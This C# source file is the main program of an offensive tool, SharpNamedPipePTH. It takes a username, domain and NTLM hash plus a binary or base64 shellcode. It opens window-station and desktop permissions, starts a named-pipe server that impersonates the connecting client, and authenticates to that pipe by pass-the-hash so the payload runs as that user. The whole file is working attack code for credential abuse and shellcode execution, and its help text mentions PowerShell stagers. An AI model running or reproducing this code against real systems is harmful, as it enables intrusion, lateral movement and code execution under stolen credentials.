using System;
using System.Threading;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Security.AccessControl;

namespace SharpNamedPipePTH
{
    class Program
    {

        public static void Main(string[] args)
        {

            //User Set
            string username = "";
            string domain = ".";
            string pipename = "ShitSecure";
            string hash = "";
            bool ForceSMB1 = false;
            string binary = "";
            string Args = "";
            string shellcode = "";
            
            bool usernamegiven = false;
            bool hashgiven = false;
            bool shellcodegiven = false;
            bool binarygiven = false;

            try
            {
                if (args.Length < 1)
                {
                    displayHelp("Usage:");
                    return;
                }
                ArgumentParserResult arguments = ArgParse.Parse(args);

                if (arguments.ParsedOk == false)
                {
                    displayHelp("Error Parsing Arguments");
                    return;
                }

                if (arguments.Arguments.ContainsKey("showhelp"))
                {
                    displayHelp("Usage:");
                    return;
                }
                if (arguments.Arguments.ContainsKey("-h"))
                {
                    displayHelp("Usage:");
                    return;
                }
                if (arguments.Arguments.ContainsKey("pipename"))
                {
                    pipename = arguments.Arguments["pipename"];
                }
                if (arguments.Arguments.ContainsKey("shellcode"))
                {
                    shellcode = arguments.Arguments["shellcode"];
                    shellcodegiven = true;
                }

                if (arguments.Arguments.ContainsKey("binary"))
                {
                    binary = arguments.Arguments["binary"];
                    binarygiven = true;
                }

                if (arguments.Arguments.ContainsKey("arguments"))
                {
                    Args = arguments.Arguments["arguments"];
                }

                if (arguments.Arguments.ContainsKey("forcesmb1"))
                {
                    ForceSMB1 = true;
                }

                if (arguments.Arguments.ContainsKey("hash"))
                {
                    hash = arguments.Arguments["hash"];
                    hashgiven = true;
                }
                if (arguments.Arguments.ContainsKey("username"))
                {
                    username = arguments.Arguments["username"];
                    usernamegiven = true;
                }

                if (arguments.Arguments.ContainsKey("domain"))
                {
                    domain = arguments.Arguments["domain"];
                }
                if (!(usernamegiven && hashgiven && ( shellcodegiven || binarygiven)))
                {
                    Console.WriteLine(usernamegiven);
                    Console.WriteLine(hashgiven);
                    Console.WriteLine(shellcodegiven);
                    Console.WriteLine(binarygiven);
                    displayHelp("Usage:");
                    return;
                }

            }
            catch
            {
                displayHelp("Error Parsing Arguments");
                return;
            }

            //Change WINSTA/DESKTOP Permissions

            GrantAccessToWindowStationAndDesktop(username);

            // Start Pipe Server
            Console.WriteLine("Starting Pipe Server Thread!");

            if (shellcodegiven)
            {
                byte[] shellcodebytes = Convert.FromBase64String(shellcode);
                Thread t = new Thread(() => SharpNamedPipePTH.PipeServerImpersonate.ImpersonateClient(pipename, binary, shellcodebytes, Args));
                t.Start();
            }
            else
            {
                byte[] shellcodebytes = null;
                Thread t = new Thread(() => SharpNamedPipePTH.PipeServerImpersonate.ImpersonateClient(pipename, binary, shellcodebytes, Args));
                t.Start();
            }
            // Connect to the Named Pipe via NamedPipePTH
            Console.WriteLine($"Connecting to the Named Pipe via Pass-the-Hash - using username {username}");
            Thread.Sleep(4000);
            SharpNamedPipePTH.NamedpipePTH.NamedPipePTH(username, domain, hash, pipename, ForceSMB1);

        }


        // Stolen from https://stackoverflow.com/questions/677874/starting-a-process-with-credentials-from-a-windows-service
        public static void GrantAccessToWindowStationAndDesktop(string username)
        {
            IntPtr handle;
            const int WindowStationAllAccess = 0x000f037f;
            handle = GetProcessWindowStation();
            GrantAccess(username, handle, WindowStationAllAccess);
            const int DesktopRightsAllAccess = 0x000f01ff;
            handle = GetThreadDesktop(GetCurrentThreadId());
            GrantAccess(username, handle, DesktopRightsAllAccess);
        }

        private static void GrantAccess(string username, IntPtr handle, int accessMask)
        {
            SafeHandle safeHandle = new NoopSafeHandle(handle);
            GenericSecurity security =
                new GenericSecurity(
                    false, ResourceType.WindowObject, safeHandle, AccessControlSections.Access);

            security.AddAccessRule(
                new GenericAccessRule(
                    new NTAccount(username), accessMask, AccessControlType.Allow));
            security.Persist(safeHandle, AccessControlSections.Access);
        }

        // All the code to manipulate a security object is available in .NET framework,
        // but its API tries to be type-safe and handle-safe, enforcing a special implementation
        // (to an otherwise generic WinAPI) for each handle type. This is to make sure
        // only a correct set of permissions can be set for corresponding object types and
        // mainly that handles do not leak.
        // Hence the AccessRule and the NativeObjectSecurity classes are abstract.
        // This is the simplest possible implementation that yet allows us to make use
        // of the existing .NET implementation, sparing necessity to
        // P/Invoke the underlying WinAPI.

        private class GenericAccessRule : AccessRule
        {
            public GenericAccessRule(
                IdentityReference identity, int accessMask, AccessControlType type) :
                base(identity, accessMask, false, InheritanceFlags.None,
                     PropagationFlags.None, type)
            {
            }
        }

        private class GenericSecurity : NativeObjectSecurity
        {
            public GenericSecurity(
                bool isContainer, ResourceType resType, SafeHandle objectHandle,
                AccessControlSections sectionsRequested)
                : base(isContainer, resType, objectHandle, sectionsRequested)
            {
            }

            new public void Persist(SafeHandle handle, AccessControlSections includeSections)
            {
                base.Persist(handle, includeSections);
            }

            new public void AddAccessRule(AccessRule rule)
            {
                base.AddAccessRule(rule);
            }

            #region NativeObjectSecurity Abstract Method Overrides

            public override Type AccessRightType
            {
                get { throw new NotImplementedException(); }
            }

            public override AccessRule AccessRuleFactory(
                System.Security.Principal.IdentityReference identityReference,
                int accessMask, bool isInherited, InheritanceFlags inheritanceFlags,
                PropagationFlags propagationFlags, AccessControlType type)
            {
                throw new NotImplementedException();
            }

            public override Type AccessRuleType
            {
                get { return typeof(AccessRule); }
            }

            public override AuditRule AuditRuleFactory(
                System.Security.Principal.IdentityReference identityReference, int accessMask,
                bool isInherited, InheritanceFlags inheritanceFlags,
                PropagationFlags propagationFlags, AuditFlags flags)
            {
                throw new NotImplementedException();
            }

            public override Type AuditRuleType
            {
                get { return typeof(AuditRule); }
            }

            #endregion
        }

        // Handles returned by GetProcessWindowStation and GetThreadDesktop should not be closed
        private class NoopSafeHandle : SafeHandle
        {
            public NoopSafeHandle(IntPtr handle) :
                base(handle, false)
            {
            }

            public override bool IsInvalid
            {
                get { return false; }
            }

            protected override bool ReleaseHandle()
            {
                return true;
            }
        }

        // end of stolen from

        // Imports, feel free porting them to D/Invoke / Syscalls :P

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr GetProcessWindowStation();

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr GetThreadDesktop(int dwThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern int GetCurrentThreadId();


        public static void displayHelp(string message)
        {
            Console.WriteLine("{0} \r\n\r\nSharpNamedPipePTH.exe username:<user> domain:<domain>  hash:<ntlm> pipename:<pipename> binary:<binary-Path>\r\n", message);
            Console.WriteLine("\r\n===========================    or for shellcode execution    ===========================");
            Console.WriteLine("\r\nSharpNamedPipePTH.exe username:<user> domain:<domain>  hash:<ntlm> pipename:<pipename> shellcode:<base64shellcode>");
            Console.WriteLine("\r\n======================  or argument usage for Powershell stagers  ======================");
            Console.WriteLine("\r\nSharpNamedPipePTH.exe username:<user> domain:<domain>  hash:<ntlm> pipename:<pipename> binary:<binary> arguments:<arguments>");
            return;
        }
    }
}
